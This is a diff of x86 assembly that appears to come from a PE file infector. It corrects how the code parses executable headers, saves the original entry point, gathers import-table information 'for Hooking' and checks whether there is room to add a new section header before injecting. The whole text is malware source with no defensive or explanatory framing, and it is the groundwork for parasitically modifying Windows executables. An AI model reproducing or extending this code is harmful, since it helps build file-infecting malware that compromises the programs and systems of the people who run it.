@@ -64,7 +64,7 @@ mov	[DELTA PeNtHeader], edx
 cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
 jne	errorInjecting
 
-; GET OPTIONAL HEADER useless so far
+; GET OPTIONAL HEADER
 mov	[DELTA PeOptionalHeader], edx
 add	[DELTA PeOptionalHeader], 018h
 
@@ -75,8 +75,13 @@ mov	[DELTA PeSectionNb], eax
 xor	ecx, ecx
 mov	cx, word ptr[eax]
 
+; GET SIZE OPTIONAL HEADER
+add	eax, 0Eh
+mov	si, word ptr [eax]
+mov	word ptr [DELTA OptHeaderSize], si
+
 ; GET ENTRY POINT
-add	eax, 022h
+add	eax, 014h
 mov	esi, [eax]
 mov	[DELTA OldEntryPoint], esi
 
@@ -93,6 +98,11 @@ add	eax, 04h
 mov	esi, [eax]
 mov	[DELTA FileAlignment], esi
 
+; GET SIZE OF HEADERS
+add	eax, 018h
+mov	esi, [eax]
+mov	[DELTA SizeOfHeaders], esi
+
 ; GET IAT Info for Hooking
 ; Because when threading it will exit our main thread
 push	ecx
@@ -108,11 +118,18 @@ mov	[DELTA OffsetIAT], 0
 pop	edx
 pop	ecx
 
+; GET START SECTION HEADER
+mov	eax, [DELTA PeNtHeader]
+add	eax, sizeof(DWORD)
+add	eax, sizeof(IMAGE_FILE_HEADER)
+xor	esi, esi
+mov	si, word ptr [DELTA OptHeaderSize]
+add	eax, esi
+mov	[DELTA PeStartHeader], eax
+mov	esi, eax
+
 
 ; LOOP SECTIONS HEADER
-mov	esi, edx
-add	esi, 0F8h
-mov	[DELTA PeStartHeader], esi
 mov	[DELTA LastSec], 0
 Loop_SectionHeader:
 ; GET LAST SECTION & CODE SECTION
@@ -152,3 +169,18 @@ mov	[DELTA OffsetIAT], edx
 notIAT:
 add	esi, 028h ; Keep End Header Section
 loop	Loop_SectionHeader
+
+
+; CHECK IF ENOUGH PADDING SECTION HEADER
+; Padding : SizeOfHeaders (Already padded) - (LastSection - uFileMap)
+nop
+nop
+nop
+nop
+mov	eax, esi
+mov	edx, [DELTA PeFileMap]
+sub	eax, edx
+mov	edx, [DELTA SizeOfHeaders]
+sub	edx, eax
+cmp	edx, sizeof(IMAGE_SECTION_HEADER)
+jl	errorInjecting
